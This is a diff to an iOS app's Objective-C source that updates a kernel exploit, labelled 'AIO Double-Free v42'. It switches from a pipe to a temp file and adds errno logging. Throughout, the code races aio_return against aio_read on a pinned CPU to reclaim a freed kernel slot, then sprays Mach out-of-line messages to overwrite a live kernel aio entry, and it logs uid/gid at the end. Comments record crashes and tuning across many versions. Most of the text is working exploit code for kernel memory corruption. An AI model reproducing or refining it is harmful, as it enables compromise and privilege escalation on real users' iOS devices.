@@ -18,6 +18,7 @@
 #import <unistd.h>
 #include <aio.h>
 #include <errno.h>
+#include <string.h>
 #include <sys/event.h>
 #include <mach/thread_policy.h>
 #include <pthread.h>
@@ -243,7 +244,7 @@ struct aio_race_state {
     struct aiocb *trigger;
     struct aiocb *rcbs;
     int nrcbs;
-    ssize_t return_result;  // v41: aio_return result from racer (used for diagnostics)
+    ssize_t return_result;  // v42: aio_return result or aio_read errno (diagnostics)
 };
 
 // v19: E2 racer state — aio_return frees E2's slot, OOL spray reclaims it.
@@ -269,7 +270,7 @@ static void *aio_free_and_reclaim_racer(void *arg) {
     aio_set_thread_affinity(42);
     while (!atomic_load_explicit(&s->start, memory_order_acquire));
     while (!atomic_load_explicit(&s->stop, memory_order_relaxed)) {
-        // v41: Spin directly on aio_return — eliminates aio_error syscall from
+        // v42: Spin directly on aio_return — eliminates aio_error syscall from
         // critical path. aio_return returns EINPROGRESS until I/O completes,
         // then returns result (>=0) if we win the unref race, or EINVAL if
         // worker already freed. One syscall instead of two.
@@ -283,7 +284,13 @@ static void *aio_free_and_reclaim_racer(void *arg) {
             if (s->rcbs && s->nrcbs > 0) {
                 int ok = 0;
                 for (int i = 0; i < s->nrcbs; i++) {
-                    if (aio_read(&s->rcbs[i]) == 0) ok++;
+                    int r = aio_read(&s->rcbs[i]);
+                    if (r == 0) {
+                        ok++;
+                    } else {
+                        // v42: capture errno for diagnostics
+                        s->return_result = (ssize_t)errno;
+                    }
                 }
                 if (ok == s->nrcbs) {
                     atomic_store_explicit(&s->reclaim_done, true, memory_order_release);
@@ -366,7 +373,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
     aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aioUafButton.configuration = aioConf;
-    [self.aioUafButton setTitle:@"AIO Double-Free v41" forState:UIControlStateNormal];
+    [self.aioUafButton setTitle:@"AIO Double-Free v42" forState:UIControlStateNormal];
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
@@ -5752,7 +5759,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO Double-Free v41 =========="];
+    [self appendLog:@"\n========== AIO Double-Free v42 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5771,7 +5778,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self appendLog:@"FAIL: could not create temp file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO Double-Free v41" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO Double-Free v42" forState:UIControlStateNormal];
         });
         return;
     }
@@ -5783,18 +5790,12 @@ static void *e2_free_and_ool_racer(void *arg) {
     write(fd, fdata, sizeof(fdata));
     [self appendLog:[NSString stringWithFormat:@"fd=%d file=32KB pid=%d uid=%d", fd, getpid(), getuid()]];
 
-    // v41: Racer spins aio_return(tcb) directly (no aio_error) → if ≥0: aio_read(pipe) LIFO.
-    // Skip aio_error syscall from critical path — one syscall instead of two.
-    // Pipe blocks → entry stays LIVE through kevent64. ~70% reclaim expected.
-    // rcbs[0] reads from a PIPE (not file) → I/O blocks forever → entry
-    // stays LIVE with valid procp through kevent64. After kevent64+
-    // close(kq), we write to pipe to unblock the worker.
+    // v42: Pipe approach failed — aio_read on pipe likely returns EINVAL (AIO
+    // restricted to regular files on iOS). Use second temp file for rcbs[0].
+    // Race is now: aio_return(slot S) → aio_read(file_fd2) reclaim slot S →
+    // kevent64 IMMEDIATELY → rcbs[0] I/O completes → safe cleanup.
     //
-    // v36-v38 all crashed FAR=0x58 because racer's aio_return created a
-    // "time bomb": worker's delayed aio_entry_unref on tcb's entry
-    // would later free rcbs[0]'s reclaimed entry before kevent64.
-    //
-    // Phase A: tcb(SIGEV_KEVENT) + racer(detect→aio_read on pipe) → kevent64
+    // Phase A: tcb(SIGEV_KEVENT) + racer(spin aio_return→aio_read) → kevent64
     // Phase B: OOL payload (&rcbs[0] spray 0x00-0xF8, markers at 0x28/0x30)
     // Phase C: OOL spray → check aio_error(&rcbs[0]) for overlap → aio_return if hit
     // Phase D: Health check
@@ -5805,19 +5806,22 @@ static void *e2_free_and_ool_racer(void *arg) {
     static char tbuf[4096];
     static char rbufs[AIO_NRECLAIM][8192];
 
-    // v41: Create pipe for rcbs[0] — read blocks forever, entry stays LIVE
-    int pipefds[2] = {-1, -1};
-    if (pipe(pipefds) != 0) {
-        [self appendLog:@"FAIL: pipe() for rcbs[0]"];
+    // v42: Create second temp file for rcbs[0] (pipe not supported by AIO on iOS)
+    NSString *rcbsPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_uaf_rcbs.bin"];
+    int fd2 = open(rcbsPath.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
+    if (fd2 < 0) {
+        [self appendLog:@"FAIL: could not create rcbs temp file"];
         goto cleanup;
     }
-    [self appendLog:[NSString stringWithFormat:@"pipe for rcbs[0]: rd=%d wr=%d", pipefds[0], pipefds[1]]];
+    char rcbsData[32768];
+    memset(rcbsData, 'R', sizeof(rcbsData));
+    write(fd2, rcbsData, sizeof(rcbsData));
+    [self appendLog:[NSString stringWithFormat:@"rcbs fd2=%d file=32KB", fd2]];
 
-    // ---- Phase A v41: racer spins on aio_return → aio_read(pipe) → kevent64 ----
-    // v41: Skip aio_error — racer directly calls aio_return in tight loop.
-    // One syscall instead of two on critical path. Better diagnostics:
-    // freed=1→aio_return never won, freed=2→aio_return won (check reclaim_done).
-    [self appendLog:@"\n--- Phase A v41: racer(aio_return spin→aio_read pipe) → kevent64 ---"];
+    // ---- Phase A v42: racer spins on aio_return → aio_read(file) → kevent64 ----
+    // v42: Skip aio_error, spin aio_return directly. rcbs[0] uses regular file
+    // (not pipe). Log errno if aio_read fails.
+    [self appendLog:@"\n--- Phase A v42: racer(aio_return spin→aio_read file) → kevent64 ---"];
 
     bool phaseA_won = false;
     for (int attempt = 0; attempt < 5; attempt++) {
@@ -5838,20 +5842,21 @@ static void *e2_free_and_ool_racer(void *arg) {
         tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
         tcb.aio_sigevent.sigev_signo = kq;
 
-        // Pre-initialize rcbs[0] with PIPE read fd — I/O blocks on empty pipe
-        // → entry stays LIVE with valid procp indefinitely.
+        // v42: rcbs[0] uses regular file fd2 (pipe not supported by AIO on iOS).
+        // File read competes with kevent64 — must be fast (no logging between
+        // reclaim check and kevent64).
         memset(&rcbs[0], 0, sizeof(rcbs[0]));
-        rcbs[0].aio_fildes = pipefds[0];  // pipe read end
+        rcbs[0].aio_fildes = fd2;
         rcbs[0].aio_buf = rbufs[0];
         rcbs[0].aio_nbytes = sizeof(rbufs[0]);
         rcbs[0].aio_offset = 0;
         rcbs[0].aio_lio_opcode = LIO_READ;
         rcbs[0].aio_sigevent.sigev_notify = SIGEV_NONE;
 
-        // v41 racer: aio_return(tcb) in tight spin loop → if ≥0: aio_read(rcbs[0] pipe)
+        // v42 racer: aio_return in tight spin → if ≥0: aio_read(rcbs[0] file)
         // Same-CPU LIFO: aio_return frees slot S on CPU 42 magazine,
-        // aio_read immediately reclaims it. Pipe blocks → entry stays LIVE.
-        // freed=0: bug (should never happen), freed=1: aio_return never won,
+        // aio_read immediately reclaims it. File read might complete quickly.
+        // freed=0: bug, freed=1: aio_return never won,
         // freed=2: aio_return won, reclaim_done tells if aio_read succeeded.
         struct aio_race_state rs = {};
         rs.trigger = &tcb;
@@ -5887,10 +5892,9 @@ static void *e2_free_and_ool_racer(void *arg) {
                 retVal, reclaimOk ? "OK (slot S)" : "FAIL (diff slot)"]];
 
             if (!reclaimOk) {
-                // aio_return freed slot S on CPU 42, but aio_read got DIFFERENT slot.
-                // Something stole slot S from CPU 42's AIO zone magazine between
-                // zfree and zalloc — possibly another AIO operation on CPU 42.
-                [self appendLog:@"  reclaim missed — slot stolen from CPU 42 magazine, retrying"];
+                // aio_read failed — retVal now holds errno from aio_read failure.
+                [self appendLog:[NSString stringWithFormat:@"  reclaim FAIL — aio_read errno=%zd (%s), retrying",
+                    retVal, strerror((int)retVal)]];
                 continue;
             }
         } else {
@@ -5900,8 +5904,8 @@ static void *e2_free_and_ool_racer(void *arg) {
         }
 
         // RECLAIM OK! rcbs[0]'s entry is at slot S (aio_return→aio_read LIFO).
-        // Pipe I/O blocks → entry stays LIVE (refcount=1, valid procp).
-        // v41: kevent64 IMMEDIATELY — no logging between check and kevent64!
+        // File I/O may compete with kevent64 — race is tight but logging is after.
+        // v42: kevent64 IMMEDIATELY — no logging between check and kevent64!
         struct kevent64_s kev = {};
         int nev = kevent64(kq, NULL, 0, &kev, 1, 0, NULL);
         bool knoteConsumed = false;
@@ -5930,44 +5934,35 @@ static void *e2_free_and_ool_racer(void *arg) {
             [self appendLog:[NSString stringWithFormat:@"  WARNING: kq=%d leaked (knote unconsumed)", kq]];
         }
 
-        // v41: Write to pipe to unblock rcbs[0]'s blocked read.
-        // Worker completes I/O → aio_entry_unref → refcount 1→0 → zfree → safe.
-        char unblock = 'X';
-        write(pipefds[1], &unblock, 1);
-        [self appendLog:@"  pipe unblock written — rcbs[0] I/O will complete"];
+        // v42: rcbs[0] is on file fd2 — wait for I/O to complete, then entry is freed.
+        while (aio_error(&rcbs[0]) == EINPROGRESS) usleep(100);
+        int rcbs0_err = aio_error(&rcbs[0]);
+        [self appendLog:[NSString stringWithFormat:@"  rcbs[0] I/O done: aio_error=%d", rcbs0_err]];
 
         phaseA_won = true;
         break;
     }
 
     if (!phaseA_won) {
-        close(pipefds[0]);
-        close(pipefds[1]);
+        close(fd2);
         [self appendLog:@"FAIL: Phase A could not reclaim slot S after 5 attempts"];
         goto cleanup;
     }
 
     if (entryAddr == 0) {
-        close(pipefds[0]);
-        close(pipefds[1]);
+        close(fd2);
         [self appendLog:@"FAIL: kev.ident=0 — aborting"];
         goto cleanup;
     }
 
-    // rcbs[0]'s entry was at slot S during kevent64 (pipe blocked → LIVE).
-    // We wrote to pipe to unblock → worker completes I/O → aio_entry_unref
-    // → refcount 1→0 → zfree → slot S freed. rcbs[0] entry is GONE now.
+    // rcbs[0]'s entry was at slot S during kevent64.
+    // File I/O likely completed by now → worker freed entry → slot S on freelist.
     // Phase B/C OOL overlap requires slot S on freelist (from zfree above).
-    while (aio_error(&rcbs[0]) == EINPROGRESS) usleep(500);
-    int rcbs0_err = aio_error(&rcbs[0]);
-    [self appendLog:[NSString stringWithFormat:@"  aio_error(rcbs[0])=%d (0=complete, slot S freed)", rcbs0_err]];
-    close(pipefds[0]);
-    close(pipefds[1]);
 
-    // ---- Phase B v41: OOL payload with &rcbs[0] spray ----
+    // ---- Phase B v42: OOL payload with &rcbs[0] spray ----
     // rcbs[0]'s entry was at slot S. We spray &rcbs[0] at all offsets so
     // aiocbp match succeeds when aio_return walks doneq.
-    [self appendLog:@"\n--- Phase B v41: OOL payload (&rcbs[0] spray) ---"];
+    [self appendLog:@"\n--- Phase B v42: OOL payload (&rcbs[0] spray) ---"];
 
     enum { kOolV35Size = 256 };
     uint8_t *oolPayload = (uint8_t *)calloc(1, kOolV35Size);
@@ -6011,13 +6006,13 @@ static void *e2_free_and_ool_racer(void *arg) {
         mach_msg_ool_descriptor_t ool;
     } OolV35Msg;
 
-    // ---- Phase C v41: Passive OOL overlap on LIVE rcbs[0] entry ----
+    // ---- Phase C v42: Passive OOL overlap on LIVE rcbs[0] entry ----
     // rcbs[0]'s entry is LIVE at slot S (in process table, on doneq).
     // OOL send → kalloc.256 from CPU 42's magazine. If slot S is on freelist
     // (duplicate from corruption), OOL reclaims it → overwrites LIVE entry.
     // We detect overlap via aio_error(&rcbs[0]) — if errorval changes from 0
     // to 0xDEAD0001, the OOL payload overwrote the entry!
-    [self appendLog:@"\n--- Phase C v41: Passive OOL overlap (rcbs[0] live) ---"];
+    [self appendLog:@"\n--- Phase C v42: Passive OOL overlap (rcbs[0] live) ---"];
 
     if (ovSend == MACH_PORT_NULL) {
         [self appendLog:@"FAIL: no OOL send port"];
@@ -6081,8 +6076,8 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self appendLog:[NSString stringWithFormat:@"  aio_return(rcbs[0])=%zd (cleanup)", cleanRet]];
     }
 
-    // ---- Phase D v41: Health check ----
-    [self appendLog:@"\n--- Phase D v41: Health check ---"];
+    // ---- Phase D v42: Health check ----
+    [self appendLog:@"\n--- Phase D v42: Health check ---"];
     {
         struct aiocb hc[4];
         char hcbuf[4][256];
@@ -6105,8 +6100,10 @@ static void *e2_free_and_ool_racer(void *arg) {
     }
 
 cleanup:
-    if (pipefds[0] != -1) close(pipefds[0]);
-    if (pipefds[1] != -1) close(pipefds[1]);
+    if (fd2 != -1) {
+        close(fd2);
+        unlink(rcbsPath.UTF8String);
+    }
     if (ovRecv != MACH_PORT_NULL) mach_port_destroy(mach_task_self_, ovRecv);
     if (ovSend != MACH_PORT_NULL) mach_port_deallocate(mach_task_self_, ovSend);
     free(oolPayload);
@@ -6114,11 +6111,11 @@ cleanup:
     close(fd);
     unlink(path.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
-    [self appendLog:@"========== AIO Double-Free v41 Complete =========="];
+    [self appendLog:@"========== AIO Double-Free v42 Complete =========="];
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO Double-Free v41" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO Double-Free v42" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
